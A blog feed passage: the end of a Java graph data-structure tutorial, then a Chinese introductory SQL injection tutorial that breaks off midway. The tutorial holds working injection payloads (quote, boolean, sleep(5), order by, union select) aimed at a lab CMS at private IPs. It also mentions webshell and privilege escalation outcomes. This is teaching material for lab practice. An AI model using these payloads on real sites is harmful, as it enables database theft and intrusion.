class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-Edge类"><a href="#3-Edge类" class="headerlink" title="3.Edge类"></a>3.Edge类</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Edge</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">int</span> weight<span class="token punctuation">;</span><span class="token comment">//边权</span><span class="token keyword">public</span> <span class="token class-name">Node</span> from<span class="token punctuation">;</span><span class="token comment">//始边</span><span class="token keyword">public</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">;</span><span class="token comment">//终边</span><span class="token keyword">public</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token keyword">int</span> weight<span class="token punctuation">,</span><span class="token class-name">Node</span> from<span class="token punctuation">,</span><span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//根据提供的三元素构建一个边</span><span class="token keyword">this</span><span class="token punctuation">.</span>weight<span class="token operator">=</span>weight<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>from<span class="token operator">=</span>from<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token keyword">to</span><span class="token operator">=</span><span class="token keyword">to</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-Graph类"><a href="#4-Graph类" class="headerlink" title="4.Graph类"></a>4.Graph类</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Graph</span> <span class="token punctuation">{</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Node</span><span class="token punctuation">&gt;</span></span> nodes<span class="token punctuation">;</span><span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">&gt;</span></span> edges<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>nodes<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>edges<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="5-将二维矩阵表示的图转化为Graph形式的图"><a href="#5-将二维矩阵表示的图转化为Graph形式的图" class="headerlink" title="5.将二维矩阵表示的图转化为Graph形式的图"></a>5.将二维矩阵表示的图转化为Graph形式的图</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GenerateGraphFromMatrix</span> <span class="token punctuation">{</span><span class="token comment">//matrix </span><span class="token comment">//weight from to</span><span class="token comment">/* * [4,1,3] * [5,2,6] * [1,2,3] */</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Graph</span> <span class="token function">createGraphFromMatrix</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">Graph</span> g<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> weight<span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> from<span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token keyword">to</span><span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//如果没有节点编号就去创建节点</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">Node</span> fromNode <span class="token operator">=</span> g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取from节点</span><span class="token class-name">Node</span> toNode<span class="token operator">=</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取to节点</span><span class="token class-name">Edge</span> edge<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span>weight<span class="token punctuation">,</span> fromNode<span class="token punctuation">,</span> toNode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//建立一条边</span>g<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//放到g的边集合中</span>fromNode<span class="token punctuation">.</span>nexts<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>toNode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//from节点添加下行节点</span>fromNode<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//from 节点添加下行边</span>fromNode<span class="token punctuation">.</span>out<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//from节点出度++</span>toNode<span class="token punctuation">.</span>in<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//to节点入度++</span><span class="token punctuation">}</span><span class="token keyword">return</span> g<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> test <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token class-name">Graph</span> graph <span class="token operator">=</span> <span class="token function">createGraphFromMatrix</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"节点数:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"边数:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1的入度:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>in<span class="token operator">+</span><span class="token string">",1的出度:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1到3的代价:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>weight<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/1009-01.jpeg" alt="测试图例" style="zoom:50%;"><p>运行结果</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">节点数:4边数:31的入度:0,1的出度:11到3的代价:4done!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/si-xiao-kai/AlgorithmDataStructure_stu/tree/main/base_graph">完整代码见我的github</a></p><h1 id="6-小结"><a href="#6-小结" class="headerlink" title="6.小结"></a>6.小结</h1><p>本文介绍了一个非常有用的图结构的表达方法，方便在上面实现图的各种算法，并且可以很方便的将其他形式的图的表示如邻接表、邻接矩阵等转化过来，进而避免了在不同结构上重新实现图算法的繁琐操作。后续会陆续讲解基于本文定义的图结构实现的各种图算法。</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> java </tag>
            
            <tag> 图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入基础</title>
      <link href="/2022/10/04/web-an-quan/sql-zhu-ru/"/>
      <url>/2022/10/04/web-an-quan/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-SQL注入简介"><a href="#一、-SQL注入简介" class="headerlink" title="一、 SQL注入简介"></a>一、 SQL注入简介</h1><h2 id="1-1-SQL简介"><a href="#1-1-SQL简介" class="headerlink" title="1.1 SQL简介"></a>1.1 SQL简介</h2><p>结构化查询语言 （Structured Query Language）是关系式数据库管理系统的标准语言（ANSI X3.135 - 1986），实际上不同数据库系统之间的SQL不能完全相互通用。</p><h3 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h3><ul><li><p>特点：明显的层次结构， 库名|表名|字段名|字段内容</p></li><li><p>例子：mysql、access、 Mssql、orcale</p></li></ul><h2 id="1-2-sql注入"><a href="#1-2-sql注入" class="headerlink" title="1.2 sql注入"></a>1.2 sql注入</h2><p> 一种常见的Web安全漏洞，攻击者利用这个漏洞，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p><p><u>攻击者通过向【用户可控参数】中注入SQL语法，【破坏原有SQL结构】达到编写程序时意料之外结果的攻击行为。</u></p><ul><li>漏洞原理：</li></ul><p>1、程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句。</p><p>2、未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中。</p><h2 id="1-3-注入点可能存在的位置"><a href="#1-3-注入点可能存在的位置" class="headerlink" title="1.3 注入点可能存在的位置"></a>1.3 注入点可能存在的位置</h2><p>Web应用在获取用户数据的地方，只要带入数据库查询，都有存在SQL注入的可能，这些地方通常包括:</p><p>1）@GET数据</p><p>2）@POST数据</p><p>3）@Cookie数据</p><p>4）@HTTP 头部（HTTP 请求报文其他字段）</p><p>GPC是最常用的三种提交数据的方法。</p><h2 id="1-4-SQL注入漏洞的危害"><a href="#1-4-SQL注入漏洞的危害" class="headerlink" title="1.4 SQL注入漏洞的危害"></a>1.4 SQL注入漏洞的危害</h2><p>1）增删改查：操作数据库数据。</p><p>2）脱库：获取数据库中的多种信息(例如:管理员后台密码)，从而脱取数据库中内容(脱库)</p><p>3）提权：如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接写入webshell或者获取服务器系统权限。例如：mof提权｜udf提权</p><h2 id="1-5-SQL注入分类"><a href="#1-5-SQL注入分类" class="headerlink" title="1.5 SQL注入分类"></a>1.5 SQL注入分类</h2><p>⚠️：数据库中三种数据类型数字、文本、时间。</p><h3 id="1-5-1-从数据类型的角度分类"><a href="#1-5-1-从数据类型的角度分类" class="headerlink" title="1.5.1 从数据类型的角度分类"></a>1.5.1 从数据类型的角度分类</h3><p>数字型：数字型注入就是说注入点的数据，拼接到SQL语句中是以数字型出现的，即数据两边没有被单引号、双引号包括。</p><p>字符型：字符型注入正好相反。</p><h3 id="1-5-2-从注入手法的角度分类"><a href="#1-5-2-从注入手法的角度分类" class="headerlink" title="1.5.2 从注入手法的角度分类"></a>1.5.2 从注入手法的角度分类</h3><p>1）联合查询：UNION query SQL injection （可联合查询注入）</p><p>2）布尔盲注：Boolean-based blind SQL injection （布尔型注入）</p><p>3）延时注入：Time-based blind SQL inj ection （基于时间延迟注入）</p><p>4）报错注入：Error-based SQL injection （报错型注入）</p><p>5）堆叠查询：Stacked queries SQL injection （可多语句查询注入）</p><h3 id="1-5-3-从注入的位置角度分类"><a href="#1-5-3-从注入的位置角度分类" class="headerlink" title="1.5.3 从注入的位置角度分类"></a>1.5.3 从注入的位置角度分类</h3><ul><li><p>GET注入</p></li><li><p>POST注入</p></li><li><p>Cookie注入</p></li><li><p>HTTP其他头字段注入</p></li><li><p>【留言板注入</p></li><li><p>搜索框注入</p></li><li><p>…】</p></li></ul><h1 id="二、Mysql基础知识"><a href="#二、Mysql基础知识" class="headerlink" title="二、Mysql基础知识"></a>二、Mysql基础知识</h1><h2 id="2-1-mysql注释"><a href="#2-1-mysql注释" class="headerlink" title="2.1 mysql注释"></a>2.1 mysql注释</h2><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 【HTTP头部注入】-- 【--空格、--+ URL注入、如果在URL注入中使用#，要将其编码为%23】/*...*/ /*!...*/ 【内联查询】<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-元数据"><a href="#2-2-元数据" class="headerlink" title="2.2 元数据"></a>2.2 元数据</h2><p>库名、表名、字段名等信息</p><h2 id="2-3-mysql元数据数据库（information-schema）"><a href="#2-3-mysql元数据数据库（information-schema）" class="headerlink" title="2.3 mysql元数据数据库（information_schema）"></a>2.3 mysql元数据数据库（information_schema）</h2><h3 id="2-3-1-information-schema的信息"><a href="#2-3-1-information-schema的信息" class="headerlink" title="2.3.1 information_schema的信息"></a>2.3.1 information_schema的信息</h3><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2024-12-05%2017.27.55.png" alt="information_schema的关键信息" style="zoom:40%;"><ul><li><p>表所属库的信息？tables-table_schema</p></li><li><p>字段所属的表名？columns-table_name</p></li><li><p>字段所属的库名？columns-table_schema</p></li><li><p>所有的表名？tables-table_name</p></li><li><p>所有的字段名？columns-column_name</p></li></ul><h4 id="EX：实验操作"><a href="#EX：实验操作" class="headerlink" title="EX：实验操作"></a>EX：实验操作</h4><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122161518766-2263322.png" alt="元数据库操作示例" style="zoom:90%;"><h3 id="5-5-4-Mysql-常用函数与参数"><a href="#5-5-4-Mysql-常用函数与参数" class="headerlink" title="5.5.4 Mysql 常用函数与参数"></a>5.5.4 Mysql 常用函数与参数</h3><p>常用函数列表：</p><table><thead><tr><th>=|&gt;|&gt;=|&lt;=|&lt;&gt;</th><th>比较运算符</th></tr></thead><tbody><tr><td>and|or</td><td>逻辑运算符  ⚠️：true 1 false 0，比较运算符和逻辑运算符的结果是 1和0.</td></tr><tr><td>version()</td><td>mysql  数据库版本</td></tr><tr><td>database()</td><td>当前数据库名</td></tr><tr><td>user()</td><td>用户名</td></tr><tr><td>current_user()</td><td>当前用户名</td></tr><tr><td>system_user()</td><td>系统用户名</td></tr><tr><td>@@datadir</td><td>数据库路径</td></tr><tr><td>@@versoin_compile_os</td><td>操作系统版本</td></tr><tr><td>length()</td><td>返回字符串的长度</td></tr><tr><td>substring()</td><td>截取字符串</td></tr><tr><td>substr()</td><td>1. 截取的字符串  2. 截取起始位置，从1开始计数  3. 截取长度</td></tr><tr><td>mid()</td><td></td></tr><tr><td>left()</td><td>从左侧开始取指定字符个数的字符串</td></tr><tr><td>concat()</td><td>没有分隔符的连接字符串</td></tr><tr><td>concat_ws()</td><td>含有分割符的连接字符串</td></tr><tr><td>group_concat()</td><td>连接一个组的字符串</td></tr><tr><td>ord()</td><td>返回ASCII 码</td></tr><tr><td>ascii()</td><td>返回ASCII 码</td></tr><tr><td>hex()</td><td>将字符串转换为十六进制</td></tr><tr><td>unhex()</td><td>hex 的反向操作</td></tr><tr><td>md5()</td><td>返回MD5 值</td></tr><tr><td>floor(x)</td><td>返回不大于x 的最大整数</td></tr><tr><td>round()</td><td>返回参数x 接近的整数</td></tr><tr><td>rand()</td><td>返回0-1 之间的随机浮点数</td></tr><tr><td>load_file()</td><td>读取文件，并返回文件内容作为一个字符串</td></tr><tr><td>sleep()</td><td>睡眠时间为指定的秒数</td></tr><tr><td>if(true,t,f)</td><td>if 判断</td></tr><tr><td>find_in_set()</td><td>返回字符串在字符串列表中的位置</td></tr><tr><td>benchmark()</td><td>指定语句执行的次数</td></tr><tr><td>name_const()</td><td>返回表作为结果</td></tr></tbody></table><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122162522971-2263927.png" alt="函数操作示例" style="zoom:90%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122162852365-2264134.png" alt="比较运算符" style="zoom:80%;"><h1 id="三、注入点的判断"><a href="#三、注入点的判断" class="headerlink" title="三、注入点的判断"></a>三、注入点的判断</h1><h2 id="3-1-以CMS站点为例"><a href="#3-1-以CMS站点为例" class="headerlink" title="3.1 以CMS站点为例"></a>3.1 以CMS站点为例</h2><p>（win2008-cms站点 -注入点判断）</p><p>为了演示SQL注入的四大基本手法，我们以CMS为例。 [http: //ip/ cms/]</p><ul><li>环境：</li></ul><p>​        环境-win2008-cms站点 </p><p>​        攻击者：win10 ICS 工具：【御剑-后台扫描】</p><ul><li>目标：</li></ul><p>​通过SQL注入漏洞获得后台管理员帐密并成功登录系统。</p><p>​后台地址[<a href="http://172.16.132.138/cms/admin/]">http://172.16.132.138/cms/admin/]</a></p><ul><li><p>四大基本手法可行性判断</p><ul><li>联合查询</li><li>报错注入</li><li>布尔盲注</li><li>延时注入</li></ul><p>对链接 [http:/ /172.16.132.138/ cms/show. php?id=33]是否是注入点进行判断。</p></li></ul><h2 id="3-2-数据库回显"><a href="#3-2-数据库回显" class="headerlink" title="3.2 数据库回显"></a>3.2 数据库回显</h2><p>当我们变换id参数(33+1|33-1) 的时候，发现同一个页面，show. php页面展现出不同的新闻内容。也就是说，数据库中的内容会回显到网页中来。初步判定，id参数会带入数据库查询，根据不同的id查询数据库，得到不同的新闻内容。猜测后台执行的SQL语句大致结构为:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> dbName <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-判断数字型还是字符型、是否可以进行报错注入"><a href="#3-3-判断数字型还是字符型、是否可以进行报错注入" class="headerlink" title="3.3 判断数字型还是字符型、是否可以进行报错注入"></a>3.3 判断数字型还是字符型、是否可以进行报错注入</h2><p>单引号</p><p>[?id=33’]</p><p>执行的SQL主语则变为</p><p>select * from tbName where id=33’ ; </p><p>页面报错，并且报错信息会回显在网页中，报错信息如下</p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL</p><p>server version for the right syntax to use near ‘ ‘ ‘ at line 1</p><p>错误信息提示单引号位置出现错误，那么说明，SQL语句从头到参数33都是正确的。也就是说，我们添加的单引号是多余的。因此，可以断定参数33前面没有引号。则，此注入点(可能)为数字型注入。</p><blockquote><p><strong>数字型？字符型？</strong><br>    注意报错信息的原理：从第一个字符开始往后读，读到语法错误然后报错。<br>    上述报错信息说明，’”‘之前都是正确的。’’是报错信息的单引号。<br>    规律：报错信息不出现数字-数字型、报错信息出现数字-字符型。</p></blockquote><h2 id="3-4-判断布尔状态是否存在"><a href="#3-4-判断布尔状态是否存在" class="headerlink" title="3.4 判断布尔状态是否存在"></a>3.4 判断布尔状态是否存在</h2><ul><li>[and 1=1]</li></ul><p>[?id=33 and 1=1 – +]</p><p>可能得SQL语句为</p><p>select * from tbName where id=33 and 1=1 –+</p><p>页面正常。存在延时状态是否存在 </p><ul><li>[and 1=2]</li></ul><p>[?id=33 and 1=2 – -+]</p><p>可能得SQL语句</p><p>select * from dbName where id=33 and 1=2 –+</p><p>页面没有新闻内容，并且数据库没有报错。由于1=2是恒假式，也就是查询条件</p><p>[where id=33 and 1=2 –+]恒假，这样的SQL语句在数据库中执行后，没有返回结果，没有新闻内容。</p><p>反过来看，页面没有新闻内容，也就是SQL语句查询条件为假。也就是说，我们写的语句</p><p>[and 1=2 –+], 起到了将查询条件置为假的作用。</p><p>那么，可以通过构造语句来控制SQL语句的查询结果并且，SQL语句查询条件真假性，在页面回显中有体现。</p><h2 id="3-5-存在延时状态是否存在"><a href="#3-5-存在延时状态是否存在" class="headerlink" title="3.5 存在延时状态是否存在"></a>3.5 存在延时状态是否存在</h2><ul><li>[and sleep(5) ]</li></ul><p>[?id=33 and sleep(5)]</p><p>注入sleep(5)语句，可以通过网络时间线看到延时。</p><p>说明sleep(5)语句起到了作用。</p><p>综上，此连接存在SQL注入漏洞。</p><h2 id="EX：-CMS站点SQL注入漏洞存在性和注入点判断"><a href="#EX：-CMS站点SQL注入漏洞存在性和注入点判断" class="headerlink" title="EX： CMS站点SQL注入漏洞存在性和注入点判断"></a>EX： CMS站点SQL注入漏洞存在性和注入点判断</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122163931252-2264775.png" alt="CMS站点SQL注入漏洞存在性和注入点判断" style="zoom:80%;"><h2 id="3-6-总结"><a href="#3-6-总结" class="headerlink" title="3.6 总结"></a>3.6 总结</h2><p>再赘述一遍。</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122164606984.png" alt="手工判断注入点的方法总结" style="zoom:80%;"><h1 id="四、联合查询注入"><a href="#四、联合查询注入" class="headerlink" title="四、联合查询注入"></a>四、联合查询注入</h1><h2 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h2><p>由于数据库中的内容会回显到页面中来，所以我们可以采用联合查询进行注入。 联合查询就是SQL语法中的union select 语句。 该语句会同时执行两条select语句，生成两张虚拟表，然后把查询到的结果进行拼接。 select ～～～ union select～～～ 由于虚拟表是二维结构，联合查询会”纵向”拼接，两张虚拟的表。<br>        联合查询的强大之处：【可以跨库跨表查询】。</p><h2 id="4-2-必要条件"><a href="#4-2-必要条件" class="headerlink" title="4.2 必要条件"></a>4.2 必要条件</h2><ul><li><p>两张虚拟的表具有相同的列数</p></li><li><p>虚拟表对应的列的数据类型相同</p></li></ul><h2 id="4-3-判断字段个数"><a href="#4-3-判断字段个数" class="headerlink" title="4.3 判断字段个数"></a>4.3 判断字段个数</h2><h3 id="4-3-1-order-by"><a href="#4-3-1-order-by" class="headerlink" title="4.3.1 order by"></a>4.3.1 order by</h3><ul><li>方法原理</li></ul><p>可以使用[order by]语句来判断当前select语句所查询的虚拟表的列数。 [order by]语句本意是按照某一列进行排序， 在mysql中可以使用数字来代替具体的列名，比如[order by 1] 就是按照第一列进行排序， 如果mysql没有找到对应的列，就会报错[Unknown co Lumn]。我们可以依次增加数字，直到数据库报错。</p><ul><li>案例：</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165104614-2265467.png" alt="order by判断字段个数示例" style="zoom:80%;"><h3 id="4-3-2-union-select"><a href="#4-3-2-union-select" class="headerlink" title="4.3.2 union select"></a>4.3.2 union select</h3><p>union select null,null,—,null–+</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">35</span> union <span class="token keyword">select</span> null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">35</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,3,4,5,6,7,8,9,10,11,12,13,14,15--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165338390-2265620.png" alt="union select判断字段个数示例" style="zoom:90%;"><ul><li>使用hackbar插件</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165422148.png" alt="hackbar插件使用示例" style="zoom:80%;"><h2 id="4-4-判断数据显示位置"><a href="#4-4-判断数据显示位置" class="headerlink" title="4.4 判断数据显示位置"></a>4.4 判断数据显示位置</h2><p>得到字段个数之后，可以尝试构造联合查询语句。<br>       这里我们并不知道表名，根据mysql数据库特性，select语句在执行的过程中，并不需要指定表名。<br>       [?id=33 union select 1,2,3,4,5,6,7,8,9,10,11, 12,13,14,15–+]<br>       [?id=33 union select null, 